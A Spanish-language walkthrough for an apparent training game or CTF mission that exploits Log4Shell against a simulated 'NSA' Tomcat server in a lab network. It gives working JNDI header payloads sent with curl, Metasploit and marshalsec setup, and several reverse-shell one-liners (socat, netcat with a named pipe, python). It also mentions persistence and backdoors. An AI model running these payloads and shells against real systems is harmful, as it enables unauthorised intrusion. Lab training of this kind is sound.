# MISSION 0: Brecha de la NSA - Writeup Completo

## 📋 Información General

**Misión:** Brecha de la NSA  
**Objetivo:** Explotar Log4Shell (CVE-2021-44228) en el servidor interno de la NSA y obtener acceso al sistema  
**Target:** `server.nsa-langley.internal` (IP: `10.10.0.100`)  
**Puerto:** `8080`  
**Servicio:** Apache Tomcat 9.0.65 con Log4j 2.14.1 vulnerable

### ✅ Herramientas Preinstaladas

**Todas las herramientas están preinstaladas en la imagen `kali-6me:latest`:**

- ✅ **kali-linux-default:** Todas las herramientas de Kali Linux (nmap, metasploit, wireshark, aircrack-ng, hydra, sqlmap, etc.)
- ✅ **Java y Maven:** Preinstalados para compilar exploits
- ✅ **Marshalsec:** Precompilado en `/opt/marshalsec/marshalsec.jar` - listo para usar
- ✅ **Exploit Log4Shell:** Template en `/home/player/exploit_log4shell/` con script `compile-exploit <IP>`
- ✅ **Scripts de misión:** En `~/scripts/` (enumerate.sh, exploit_log4shell.sh, etc.)

**No necesitas instalar nada manualmente.** Todas las herramientas están disponibles al iniciar el juego.

---

## 🔍 Fase 1: Descubrimiento y Enumeración Inicial

### Objetivo
Identificar el objetivo, descubrir la IP del servidor, enumerar los servicios disponibles y detectar la vulnerabilidad Log4Shell.

### 📝 Usar Scripts de Enumeración (Recomendado)

Se han creado scripts automatizados en `/home/player/scripts/` que puedes usar o editar según necesites:

```bash
# Ver scripts disponibles
ls -la ~/scripts/

# Ejecutar script de enumeración
~/scripts/enumerate.sh

# O editar el script antes de ejecutarlo
nano ~/scripts/enumerate.sh
chmod +x ~/scripts/enumerate.sh
./scripts/enumerate.sh
```

### Paso 1: Descubrir la IP del servidor

El servidor tiene un domain name: `server.nsa-langley.internal`. Necesitas descubrir su IP usando `whatweb`:

```bash
whatweb server.nsa-langley.internal
```

**Resultado esperado:**
```
WhatWeb report for server.nsa-langley.internal
IP Address: 10.10.0.100
Status    : 200 OK
Title     : NSA Internal Portal
Server    : Apache Tomcat/9.0.65
X-Powered-By: Servlet/4.0
Host      : server.nsa-langley.internal

[+] IP descubierta: 10.10.0.100
[+] Red: 10.10.0.0/24 (clase A privada)
```

### Paso 2: Escaneo de puertos con nmap

Una vez descubierta la IP (`10.10.0.100`), escanea los puertos abiertos:

```bash
# Escaneo completo de todos los puertos
nmap -sV -p- 10.10.0.100

# O escaneo específico del puerto 8080
nmap -sV -p 8080 10.10.0.100
```

**Resultado esperado:**
```
Starting Nmap 7.98 ( https://nmap.org ) at ...

Nmap scan report for server.nsa-langley.internal (10.10.0.100)
Host is up (0.000s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat 9.0.65
|_http-title: NSA Internal Portal
|_http-server-header: Apache Tomcat/9.0.65
```

**Información clave:**
- Puerto `8080` abierto con Apache Tomcat 9.0.65
- Versión vulnerable de Log4j: 2.14.1

### Paso 3: Verificar el servicio web

Accede al servicio web para confirmar que está activo:

```bash
curl http://10.10.0.100:8080/
```

**Resultado esperado:**
```html
<!DOCTYPE html>
<html>
<head><title>NSA Internal Portal</title></head>
<body>
<h1>Apache Tomcat/9.0.65</h1>
<p>Log4j 2.14.1</p>
<p>Welcome to NSA Internal Portal</p>
<p>Domain: server.nsa-langley.internal</p>
</body>
</html>
```

---

## 🎯 Fase 2: Explotación de Log4Shell

### ¿Qué es Log4Shell?

Log4Shell (CVE-2021-44228) es una vulnerabilidad crítica de ejecución remota de código (RCE) en Apache Log4j. Permite a un atacante ejecutar código Java arbitrario en el servidor mediante la inyección de payloads JNDI (Java Naming and Directory Interface).

### Cómo funciona la explotación

El servidor vulnerable procesa logs que contienen payloads JNDI. Cuando Log4j procesa un log con un payload como `${jndi:ldap://attacker.com/a}`, intenta conectarse al servidor LDAP especificado y ejecutar código remoto.

### 📋 Guía Rápida: Explotación Manual Paso a Paso

**✅ NOTA IMPORTANTE:** Todas las herramientas ya están preinstaladas en la imagen de Kali (`kali-6me:latest`). **No necesitas instalar nada manualmente.** Las herramientas disponibles incluyen:

- **Herramientas de pentesting completas:** `kali-linux-default` incluye nmap, metasploit, wireshark, aircrack-ng, hydra, sqlmap, y todas las herramientas estándar de Kali Linux
- **Herramientas básicas:** curl, wget, git, python3, nmap, netcat, socat, procps, iproute2, tree, whatweb, vim, nano, etc.
- **Java y Maven:** Preinstalados y listos para compilar exploits
- **Marshalsec:** Precompilado en `/opt/marshalsec/marshalsec.jar` - listo para usar
- **Exploit Log4Shell:** Template precompilado en `/home/player/exploit_log4shell/` con script helper `compile-exploit <IP>`

**Verificar herramientas:**
```bash
which nmap javac mvn git curl socat
# Todas deberían estar disponibles inmediatamente
```

**Paso 1: Conectarse a la red compartida (⭐ IMPORTANTE)**
Primero, conecta tu contenedor Kali a la red compartida de la misión:
```bash
connect
```
Esto conecta tu contenedor a la red `sme-mission-network` (10.10.0.0/24) donde está el servidor víctima.

**Paso 2: Obtener tu IP en la red compartida**
```bash
# Obtener tu IP en la red 10.10.0.0/24
ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1
```
Obtendrás algo como: `10.10.0.2` o `10.10.0.7` (IP en la red compartida)

**⚠️ IMPORTANTE:** Usa la IP en la red `10.10.0.0/24`, no otras IPs como `172.17.0.1` o `192.168.x.x`

**Paso 4: Iniciar listener de reverse shell**

⚠️ **IMPORTANTE:** El comando `nc -nlvp 4444` se queda escuchando indefinidamente. **Este terminal no puede mantener comandos de larga duración directamente**, por lo que debes ejecutarlo en background usando `&`:

**Opción 1: Usar socat (⭐ RECOMENDADO - Más confiable)**
```bash
# socat es más confiable que netcat para listeners en background
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash > /tmp/listener.log 2>&1 &
SOCAT_PID=$!
echo "Listener socat iniciado (PID: $SOCAT_PID)"
echo "Para detener: kill $SOCAT_PID"
```

**Opción 2: Usar netcat en background**
```bash
# Ejecutar en background
nc -lvp 4444 > /tmp/nc_listener.log 2>&1 &
NC_PID=$!
echo "Listener netcat iniciado (PID: $NC_PID)"
echo "Para detener: kill $NC_PID"
```

**Verificar que el listener está activo:**
```bash
# Ver el log del listener
tail -f /tmp/nc_listener.log
# O para socat:
tail -f /tmp/listener.log

# Verificar procesos
ps aux | grep -E "(nc|socat)" | grep -v grep

# Verificar que está escuchando en el puerto
netstat -tuln | grep 4444 2>/dev/null || ss -tuln | grep 4444
```

**Opción 3: Usar el script de explotación (⭐ MÁS FÁCIL - Automático)**
El script `exploit_log4shell.sh` detecta automáticamente si tienes `socat` o `netcat` y usa el mejor disponible:
```bash
~/scripts/exploit_log4shell.sh --local-ip <TU_IP> --target-ip 10.10.0.100
```

**Paso 5: Enviar payload Log4Shell**

Una vez que el listener está activo en background, envía el payload:

```bash
# Primero obtener tu IP en la red compartida (10.10.0.0/24)
MY_IP=$(ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1)
echo "Tu IP: $MY_IP"

# Enviar payload (usar puerto LDAP 1389 si usas marshalsec, o 4444 para listener directo)
curl -H "User-Agent: \${jndi:ldap://$MY_IP:1389/a}" \
     -H "X-Api-Version: \${jndi:ldap://$MY_IP:1389/a}" \
     http://10.10.0.100:8080/
```

**O usar el script automatizado (más fácil):**
```bash
~/scripts/exploit_log4shell.sh --local-ip $MY_IP --target-ip 10.10.0.100
```

**Paso 6: Verificar si el payload fue procesado**
Si ves en la respuesta HTML: `[Log4j processed: ...]`, el payload fue procesado exitosamente.

**Paso 7: Conectarse al servidor**
```bash
connect
```

### Métodos de explotación

Tienes **dos opciones** para explotar Log4Shell:

### ⚠️ ¿Por qué Metasploit puede fallar?

El exploit de Metasploit puede fallar por varias razones:

1. **Error de SRVHOST:** Si ves `The SRVHOST option must be set to a routable IP address`, significa que configuraste `SRVHOST` incorrectamente. **NO uses la IP del servidor víctima (`10.10.0.100`)**. Usa la IP de tu contenedor Kali (la misma que `LHOST`).

2. **Error de check automático:** El exploit ejecuta un **check automático** antes de intentar la explotación. Este check envía payloads de prueba y espera respuestas específicas del servidor para confirmar la vulnerabilidad. El servidor simulado detecta y procesa payloads Log4Shell correctamente, pero puede no responder exactamente como espera el scanner de Metasploit, causando el error:
   ```
   [-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability.
   ```
   **Solución:** Usa `set ForceExploit true` para forzar la explotación sin el check.

3. **Error de HTTP_HEADER:** Si ves `No HTTP_HEADER was specified`, debes especificar un header HTTP explícitamente:
   ```
   set HTTP_HEADER User-Agent
   ```

**Recomendación:** Si Metasploit sigue fallando después de corregir estos errores, usa la **explotación manual con `curl`** (Opción 2), que es más simple y confiable en este entorno simulado.

---

### **OPCIÓN 1: Usar Metasploit Framework (Recomendado)**

Metasploit tiene un exploit automatizado para Log4Shell que facilita la explotación.

#### Paso 1: Iniciar Metasploit

```bash
msfconsole
```

Espera a que aparezca el prompt `msf6 >`.

#### Paso 2: Seleccionar el exploit

```bash
use exploit/multi/http/log4shell_header_injection
```

#### Paso 3: Configurar el target

```bash
set RHOSTS 10.10.0.100
set RPORT 8080
set TARGETURI /
```

#### Paso 4: Configurar el payload (reverse shell)

**⚠️ IMPORTANTE:** Este exploit es para aplicaciones **Java** (Apache Tomcat), por lo que necesitas un payload de **Java**, no de Linux nativo.

```bash
set payload java/shell_reverse_tcp
set LHOST <TU_IP_LOCAL>
set LPORT 4444
```

**Nota:** `<TU_IP_LOCAL>` debe ser la IP de tu máquina Kali Linux en la red Docker. Puedes obtenerla con:
```bash
ip addr
```

Busca la IP en la interfaz `eth0` (probablemente en el rango `10.10.0.x` si estás en la red compartida `sme-mission-network`).

#### Paso 4.5: Configurar SRVHOST (servidor LDAP malicioso)

**⚠️ CRÍTICO:** El exploit necesita un servidor LDAP/HTTP que el servidor víctima pueda alcanzar. Debes configurar `SRVHOST` con la **IP de TU contenedor Kali**, NO la IP del servidor víctima.

```bash
set SRVHOST <TU_IP_LOCAL>
```

**Ejemplo:** Si tu IP es `172.17.0.15`:
```bash
set SRVHOST 172.17.0.15
```

**⚠️ ERROR COMÚN:** NO uses `10.10.0.100` (IP del servidor víctima) como `SRVHOST`. `SRVHOST` debe ser la IP donde Metasploit levantará el servidor LDAP malicioso, es decir, la IP de tu contenedor Kali.

**Importante:** `SRVHOST` debe ser la misma IP que `LHOST` y debe ser accesible desde el servidor víctima (`10.10.0.100`). Si ambos están en la red compartida `sme-mission-network`, usa la IP de tu contenedor Kali en esa red (probablemente `10.10.0.x`).

#### Paso 5: Configurar HTTP_HEADER (si es necesario)

Si el exploit muestra el error `No HTTP_HEADER was specified`, debes especificar un header HTTP explícitamente:

```bash
set HTTP_HEADER User-Agent
```

O puedes usar otros headers comunes:
```bash
set HTTP_HEADER X-Api-Version
```

#### Paso 6: Forzar la explotación (si el check falla)

**⚠️ IMPORTANTE:** Si Metasploit muestra el error `Cannot reliably check exploitability`, el servidor simulado puede no responder correctamente al check automático. En este caso, debes forzar la explotación:

```bash
set ForceExploit true
```

**¿Por qué falla el check?** El servidor simulado detecta y procesa payloads Log4Shell, pero el scanner automático de Metasploit puede no detectar la vulnerabilidad porque el servidor no implementa completamente todas las respuestas esperadas por el check.

#### Paso 7: Ejecutar el exploit

```bash
exploit
```

**Resultado esperado:**
- Si el exploit es exitoso, deberías ver una respuesta del servidor indicando que procesó el payload Log4Shell.
- Si obtienes una sesión de Metasploit, puedes interactuar con el shell remoto.
- Si no obtienes sesión pero el servidor procesó el payload, puedes usar el comando `connect` para acceder al servidor víctima.

---

### **OPCIÓN 2: Explotación manual con curl (⭐ RECOMENDADO - Más confiable)**

Si Metasploit no funciona o prefieres explotar manualmente, puedes usar `curl` con headers maliciosos. **Esta es la forma más confiable en este entorno simulado** y evita los problemas de configuración de Metasploit.

#### 📝 Usar Script de Explotación (⭐ RECOMENDADO - Para pentesters)

Se ha creado un script automatizado diseñado para pentesters que requiere especificar las IPs explícitamente:

```bash
# Obtener tu IP local primero
ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1

# Ejecutar script de explotación (especificar IPs)
~/scripts/exploit_log4shell.sh --local-ip <TU_IP> --target-ip 10.10.0.100
```

**Ejemplo completo:**
```bash
# 1. Obtener tu IP
MY_IP=$(ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
echo "Tu IP: $MY_IP"

# 2. Ejecutar explotación
~/scripts/exploit_log4shell.sh --local-ip $MY_IP --target-ip 10.10.0.100 --port 4444
```

**Opciones del script:**
```bash
# Ver ayuda
~/scripts/exploit_log4shell.sh --help

# Especificar puerto personalizado
~/scripts/exploit_log4shell.sh --local-ip 172.17.0.15 --target-ip 10.10.0.100 --port 5555

# Usar alias --target en lugar de --target-ip
~/scripts/exploit_log4shell.sh --local-ip 172.17.0.15 --target 10.10.0.100
```

**El script:**
1. ✅ Valida que las IPs estén correctamente especificadas
2. ✅ Inicia un listener de netcat en background
3. ✅ Envía el payload Log4Shell al servidor
4. ✅ Verifica si el payload fue procesado
5. ✅ Te indica cómo verificar la conexión

#### Paso 2: Verificar que el payload fue procesado

Después de ejecutar el script, deberías ver:

```
[+] ¡Payload Log4Shell procesado exitosamente!
[+] El servidor debería intentar conectarse a tu listener
```

**Resultado esperado en la respuesta HTTP:**
```html
<html>
<head><title>NSA Internal Portal</title></head>
<body>
<h1>Apache Tomcat/9.0.65</h1>
<p>Log4j 2.14.1</p>
<p>Welcome to NSA Internal Portal</p>
<p>Domain: server.nsa-langley.internal</p>
<p style="color:red;">[Log4j processed: ${jndi:ldap://172.17.0.20:4444/a}]</p>
</body>
</html>
```

**✅ Si ves el mensaje `[Log4j processed: ...]`, significa que el servidor procesó el payload y Log4Shell fue explotado exitosamente.**

#### Paso 3: Conectarte al servidor víctima

**Opción A: Usar el comando `connect` (⭐ RECOMENDADO - Conecta a la red compartida):**
```bash
connect
```

Este comando conecta tu contenedor Kali a la red compartida de la misión activa (`sme-mission-network`). Esto te permite:
- Enumerar el servidor víctima (10.10.0.100)
- Ejecutar exploits (como Log4Shell)
- Establecer reverse shells

**⚠️ Requisitos:**
- Debe haber una misión activa
- El servidor víctima debe estar corriendo

Una vez conectado, el script `exploit_log4shell.sh` detectará automáticamente tu IP en la red compartida.

**Opción B: Verificar el listener:**
```bash
# Ver logs del listener
tail -f /tmp/nc_listener.log

# O verificar procesos de netcat
ps aux | grep nc
```

#### Explotación Manual (sin script)

Si prefieres hacerlo manualmente:

**Paso 1: Conectarse a la red compartida (⭐ PRIMERO)**
```bash
connect
```
Esto conecta tu contenedor a la red `sme-mission-network` (10.10.0.0/24).

**Paso 2: Obtener tu IP en la red compartida**
```bash
# Obtener tu IP en la red 10.10.0.0/24
ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1
```
Obtendrás algo como: `10.10.0.2` o `10.10.0.7`

**Paso 2: Iniciar listener (en background)**

**Opción A: Usar socat (⭐ RECOMENDADO)**
```bash
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash > /tmp/listener.log 2>&1 &
SOCAT_PID=$!
echo "Listener socat iniciado (PID: $SOCAT_PID)"
```

**Opción B: Usar netcat**
```bash
nc -lvp 4444 > /tmp/nc_listener.log 2>&1 &
NC_PID=$!
echo "Listener netcat iniciado (PID: $NC_PID)"
```

**Paso 4: Enviar payload**

**⭐ RECOMENDADO: Usar el script de explotación (más confiable):**

El script ahora detecta automáticamente tu IP en la red compartida. Puedes usarlo sin especificar `--local-ip`:

```bash
bash ~/scripts/exploit_log4shell.sh --target-ip 10.10.0.100 --port 4444
```

O especificar la IP manualmente (debe ser una IP en la red `10.10.0.0/24`):

```bash
# Obtener tu IP en la red compartida
ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1

# Usar esa IP en el script
bash ~/scripts/exploit_log4shell.sh --local-ip 10.10.0.2 --target-ip 10.10.0.100 --port 4444
```

**⚠️ IMPORTANTE:** Usa la IP en la red `10.10.0.0/24` (no `172.17.0.1` ni `192.168.x.x`), ya que ahora todos los contenedores están en la red compartida `sme-mission-network`.

**Oneliner manual (si el script no funciona):**

**Opción A: Con comillas simples (evita problemas con $):**
```bash
MY_IP='172.17.0.1' && curl -H 'User-Agent: ${jndi:ldap://'$MY_IP':4445/a}' -H 'X-Api-Version: ${jndi:ldap://'$MY_IP':4445/a}' http://10.10.0.100:8080/
```

**Opción B: Sin variable (reemplaza 172.17.0.1 con tu IP y 4445 con tu puerto):**
```bash
curl -H 'User-Agent: ${jndi:ldap://172.17.0.1:4445/a}' -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:4445/a}' http://10.10.0.100:8080/
```

**Opción C: Usar printf para construir el payload:**
```bash
MY_IP="172.17.0.1" && PAYLOAD=$(printf '${jndi:ldap://%s:4445/a}' "$MY_IP") && curl -H "User-Agent: $PAYLOAD" -H "X-Api-Version: $PAYLOAD" http://10.10.0.100:8080/
```

**⚠️ Nota:** Si ves "Error iniciando comando", usa el script de explotación en su lugar.

**Nota:** El servidor simulado detecta el payload `${jndi:...}` en los headers y automáticamente intenta establecer un reverse shell hacia la IP especificada en el payload. No necesitas un servidor LDAP real para este entorno.

**⚠️ Si recibes "Respuesta HTTP: 000":**
- El servidor víctima no está corriendo. Asegúrate de haber iniciado la misión 0.
- Verifica que el servidor esté accesible: `curl http://10.10.0.100:8080`

**⚠️ IMPORTANTE - Problema de red y reverse shell:**

**¿Por qué no funciona el reverse shell automático?**

El problema es que los contenedores Docker pueden estar en redes diferentes:

1. **El contenedor Kali puede estar en `--network=host`**: El listener escucha en el host, pero el contenedor víctima está en una red Docker diferente (`sme-mission-network`) y no puede alcanzar la IP del host directamente.

2. **El contenedor Kali puede estar en la red compartida `sme-mission-network`**: En este caso, necesitas la IP del contenedor Kali dentro de esa red (algo como `10.10.0.x`), no la IP del host (`172.17.0.1`).

**Solución recomendada: Usar el comando `connect`**

En lugar de esperar el reverse shell, usa el comando `connect` que se conecta directamente al servidor víctima:

```bash
connect
```

Este comando funciona independientemente de la configuración de red y es más confiable que el reverse shell automático.

**Si quieres probar el reverse shell manualmente:**

1. **Verifica en qué red está tu contenedor Kali:**
   ```bash
   # Obtener ID del contenedor
   docker ps | grep kali
   
   # Ver la red del contenedor
   docker inspect <CONTAINER_ID> | grep -A 10 "Networks"
   ```

2. **Si está en `--network=host`**: El reverse shell puede no funcionar porque el contenedor víctima no puede alcanzar el host directamente.

3. **Si está en la red compartida**: Usa la IP del contenedor Kali dentro de esa red (no `172.17.0.1`).

### Probar el listener (verificar que funciona)

Para probar que tu listener está funcionando, puedes enviarte un reverse shell a ti mismo:

**⚠️ Error común:** `bash -c 'bash -i >& /dev/tcp/IP:PUERTO 0&>1'` tiene un error de sintaxis. Debe ser `0>&1` (sin el `&` antes del `>`).

**⚠️ IMPORTANTE:** El reverse shell **NO funciona manualmente** desde la terminal del contenedor Kali porque:

1. **El comando se ejecuta con `sh`, no `bash`**: La terminal ejecuta comandos con `sh`, que no soporta la sintaxis `>&` de la misma manera.
2. **`/dev/tcp/` puede no estar disponible**: Este método requiere que bash esté compilado con soporte para `/dev/tcp/`, que puede no estar habilitado en contenedores Docker.
3. **El listener debe estar activo ANTES**: El listener debe estar corriendo en background antes de intentar conectarse.

**Para probar el reverse shell, usa estos métodos:**

**Opción 1: Usar socat (⭐ RECOMENDADO - Más confiable)**
```bash
# Primero, asegúrate de que el listener está activo
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash > /tmp/listener.log 2>&1 &

# Luego, desde OTRA terminal o desde el servidor víctima, conectar:
socat TCP:172.17.0.1:4444 EXEC:/bin/bash
```

**Opción 2: Usar netcat**
```bash
# Si netcat soporta -e
nc 172.17.0.1 4444 -e /bin/bash

# O si -e no funciona (usar named pipe)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f
```

**⚠️ Nota sobre `/dev/tcp/`:** Este método puede no funcionar en contenedores Docker. Si ves "No such file or directory" o "Bad fd number", usa `socat` o `netcat`.

**Opción 2: Usar socat (⭐ RECOMENDADO - Más confiable)**
```bash
# Conectar y ejecutar bash
socat TCP:172.17.0.1:4444 EXEC:/bin/bash
```

**Opción 3: Usar netcat con named pipe (si -e no funciona)**
```bash
# Método 1: Si netcat soporta -e
nc 172.17.0.1 4444 -e /bin/bash

# Método 2: Si -e no funciona (usar named pipe)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f
```

**Opción 4: Usar python (si está disponible)**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Nota:** Reemplaza `172.17.0.1` con tu IP y `4444` con el puerto donde está escuchando tu listener.

**Verificar que el listener está activo antes de probar:**
```bash
# Ver procesos
ps aux | grep -E "(socat|nc)" | grep -v grep

# Ver logs
tail -f /tmp/listener.log  # para socat
tail -f /tmp/nc_listener.log  # para netcat
```

### 🔍 Verificar si hay una reverse shell activa

Una vez que has enviado el payload Log4Shell, necesitas verificar si el servidor víctima se conectó a tu listener. Aquí tienes varias formas de verificar:

**Opción 1: Ver conexiones de red activas (⭐ RECOMENDADO)**
```bash
# Ver todas las conexiones en el puerto del listener
netstat -antp | grep :4444

# O usar ss (más moderno)
ss -antp | grep :4444

# Ver todas las conexiones establecidas
netstat -antp | grep ESTABLISHED | grep :4444
ss -antp | grep ESTABLISHED | grep :4444
```

**Resultado esperado si hay una conexión activa:**
```
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      437/socat
tcp        0      0 10.10.0.2:4444          10.10.0.100:xxxxx        ESTABLISHED 437/socat
```

**Opción 2: Ver procesos listener y sus conexiones**
```bash
# Ver todos los procesos socat/netcat
ps aux | grep -E "(socat|nc)" | grep -v grep

# Ver qué puertos están escuchando
netstat -tlnp | grep -E "(4444|4445|4446)"
ss -tlnp | grep -E "(4444|4445|4446)"
```

**Opción 3: Ver logs del listener**
```bash
# Ver logs de socat
tail -f /tmp/nc_listener.log

# Ver logs de netcat
tail -f /tmp/nc_listener.log

# Ver últimas líneas del log
tail -20 /tmp/nc_listener.log
```

**Opción 4: Verificar desde el servidor víctima (si tienes acceso)**
```bash
# Desde el servidor víctima, verificar si hay conexiones salientes
netstat -antp | grep ESTABLISHED | grep :4444
ss -antp | grep ESTABLISHED | grep :4444
```

**⚠️ Nota importante:** Cuando `socat` o `netcat` reciben una conexión y ejecutan `/bin/bash`, esa sesión de bash se ejecuta en background y no está conectada directamente a tu terminal. Para interactuar con la shell, necesitas:

1. **Usar el comando `connect`** (recomendado):
   ```bash
   connect
   ```

2. **O conectarte manualmente al listener** (si el listener soporta múltiples conexiones):
   ```bash
   # Conectar al listener usando netcat
   nc localhost 4444
   
   # O usando socat
   socat TCP:localhost:4444 EXEC:/bin/bash
   ```

**Si no ves conexiones ESTABLISHED:**
- El payload puede no haber sido procesado correctamente
- Verifica que el listener esté activo: `ps aux | grep socat`
- Verifica que el servidor víctima esté corriendo: `curl http://10.10.0.100:8080`
- Revisa los logs del servidor víctima (si tienes acceso)
- Intenta enviar el payload de nuevo

---

## 🔐 Fase 3: Conectarse al servidor víctima

Una vez que Log4Shell ha sido explotado exitosamente, puedes conectarte al servidor víctima usando el comando `connect`:

```bash
connect
```

Este comando te conecta directamente al servidor víctima y te da acceso a un shell interactivo.

**Resultado esperado:**
```
Conectado al servidor víctima: server.nsa-langley.internal (10.10.0.100)
user@server.nsa-langley.internal:/home/user$ 
```

**¡Importante!** El cortafuegos cuántico se reinicia en 10 minutos después de obtener el shell. Tienes tiempo limitado para explorar el sistema, establecer persistencia y crear backdoors.

**Alternativa:** Si el comando `connect` no está disponible, el servidor debería intentar conectarse automáticamente a tu listener de netcat. Verifica los logs del listener:
```bash
tail -f /tmp/nc_listener.log
```

---

## 🔍 Fase 4: Exploración del sistema víctima

Una vez que tienes el reverse shell, explora el sistema para encontrar información sensible:

### Comandos útiles

```bash
# Ver directorio actual
pwd

# Listar archivos
ls -la

# Cambiar directorio
cd /opt/nsa-server

# Buscar archivos interesantes
find / -name "*cronos*" 2>/dev/null
find / -name "*.enc" 2>/dev/null

# Leer archivos
cat /opt/nsa-server/logs/server_logs.txt
cat /opt/nsa-server/protocols/protocol_cronos.enc
```

### Directorios importantes

- `/opt/nsa-server/` - Directorio principal del servidor NSA
- `/opt/nsa-server/logs/` - Logs del servidor
- `/opt/nsa-server/protocols/` - Protocolos clasificados
- `/opt/nsa-server/classified/` - Datos clasificados
- `/home/user/` - Directorio home del usuario

---

## 📝 Scripts de Explotación

### Scripts Disponibles

Se han creado scripts automatizados en `/home/player/scripts/` para facilitar la enumeración y explotación:

1. **`enumerate.sh`** - Automatiza la enumeración inicial (whatweb, nmap, curl)
2. **`exploit_log4shell.sh`** - Automatiza la explotación Log4Shell simplificada (requiere especificar IPs)
3. **`exploit_log4shell_real.sh`** - ⭐ **NUEVO** - Explotación real de Log4Shell usando marshalsec y exploit compilado
4. **`compile_exploit.sh`** - Compila el exploit Java con tu IP actual
5. **`start_log4shell_servers.sh`** - Inicia marshalsec LDAP server y HTTP server para servir el exploit

### Cómo Usar los Scripts

#### Ver scripts disponibles:
```bash
ls -la ~/scripts/
```

#### ✅ Herramientas Preinstaladas:
**Todas las herramientas ya están disponibles desde el inicio.** La imagen `kali-6me:latest` incluye:
- **kali-linux-default:** Todas las herramientas de pentesting (nmap, metasploit, wireshark, aircrack-ng, hydra, sqlmap, etc.)
- **Java y Maven:** Preinstalados para compilar exploits
- **Marshalsec:** Precompilado en `/opt/marshalsec/marshalsec.jar`
- **Exploit template:** En `/home/player/exploit_log4shell/` con script `compile-exploit <IP>`

**Verificar herramientas:**
```bash
which nmap javac mvn git curl socat
# Todas deberían estar disponibles inmediatamente
```

#### Ejecutar script de enumeración:
```bash
~/scripts/enumerate.sh
```

#### Ejecutar script de explotación simplificada:
```bash
# Primero obtener tu IP en la red compartida
ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1

# Luego ejecutar el script con tu IP
~/scripts/exploit_log4shell.sh --local-ip <TU_IP> --target-ip 10.10.0.100
```

#### ⭐ Explotación Real de Log4Shell (RECOMENDADO - Más realista):
Para una explotación real de Log4Shell usando marshalsec (precompilado) y un exploit Java:

```bash
# 1. Obtener tu IP en la red compartida (10.10.0.0/24)
MY_IP=$(ip addr show | grep 'inet 10.10.0' | awk '{print $2}' | cut -d/ -f1)
echo "Tu IP: $MY_IP"

# 2. Compilar el exploit con tu IP (si no está compilado)
compile-exploit $MY_IP
# O usar el script:
~/scripts/compile_exploit.sh

# 3. Iniciar servidores LDAP (marshalsec) y HTTP
~/scripts/start_log4shell_servers.sh
# Esto iniciará:
# - Servidor HTTP en puerto 8000 (sirve Exploit.class)
# - Servidor LDAP malicioso (marshalsec) en puerto 1389

# 4. Iniciar listener de reverse shell
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash > /tmp/listener.log 2>&1 &

# 5. Enviar payload Log4Shell real
~/scripts/exploit_log4shell_real.sh
# O manualmente:
curl -H "User-Agent: \${jndi:ldap://$MY_IP:1389/a}" \
     -H "X-Api-Version: \${jndi:ldap://$MY_IP:1389/a}" \
     http://10.10.0.100:8080/
```

**Nota:** 
- **Marshalsec ya está precompilado** en `/opt/marshalsec/marshalsec.jar` - normalmente no necesitas compilarlo
- El exploit se compila automáticamente con tu IP cuando inicias la misión
- Solo necesitas recompilar el exploit si cambias de red o IP: `compile-exploit <NUEVA_IP>`

**Si necesitas compilar marshalsec manualmente (si no está precompilado):**

```bash
# 1. Verificar que Java y Maven están instalados
java -version
mvn -version

# 2. Clonar el repositorio de marshalsec
cd /tmp
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec

# 3. Compilar con Maven (esto puede tardar varios minutos)
mvn clean package -DskipTests

# 4. Copiar el JAR compilado a /opt/marshalsec/
mkdir -p /opt/marshalsec
cp target/marshalsec-*.jar /opt/marshalsec/marshalsec.jar

# 5. Verificar que se compiló correctamente
ls -lh /opt/marshalsec/marshalsec.jar
java -cp /opt/marshalsec/marshalsec.jar marshalsec.jndi.LDAPRefServer --help
```

**Comandos Maven utilizados:**
- `mvn clean package -DskipTests`: Limpia el proyecto, compila y empaqueta en un JAR, saltando los tests para acelerar la compilación
- El JAR resultante estará en `target/marshalsec-*.jar`

### Editar Scripts con nano

Puedes editar los scripts para personalizarlos según tus necesidades:

```bash
# Editar script de enumeración
nano ~/scripts/enumerate.sh

# Editar script de explotación
nano ~/scripts/exploit_log4shell.sh

# Guardar en nano: Ctrl+O, Enter, Ctrl+X
# Hacer ejecutable después de editar:
chmod +x ~/scripts/exploit_log4shell.sh
```

### Crear Nuevos Scripts

Puedes crear tus propios scripts:

```bash
# Crear nuevo script
nano ~/scripts/mi_script.sh

# Agregar contenido (ejemplo):
#!/bin/bash
echo "Mi script personalizado"
# ... tus comandos aquí ...

# Guardar (Ctrl+O, Enter, Ctrl+X)
# Hacer ejecutable
chmod +x ~/scripts/mi_script.sh
# Ejecutar
~/scripts/mi_script.sh
```

---

## 📝 Secuencia de Comandos Completa

Aquí está la secuencia completa de comandos para completar la misión:

### Opción A: Usando Scripts (⭐ RECOMENDADO - Para pentesters)

```bash
# 1. Conectarse a la red compartida (⭐ PRIMERO)
connect
# Esto conecta tu contenedor a la red 10.10.0.0/24 donde está el servidor víctima

# 2. Enumeración automatizada
~/scripts/enumerate.sh
# O manualmente:
whatweb server.nsa-langley.internal
nmap -sV -p 8080 10.10.0.100

# 3. Obtener tu IP en la red compartida (10.10.0.0/24)
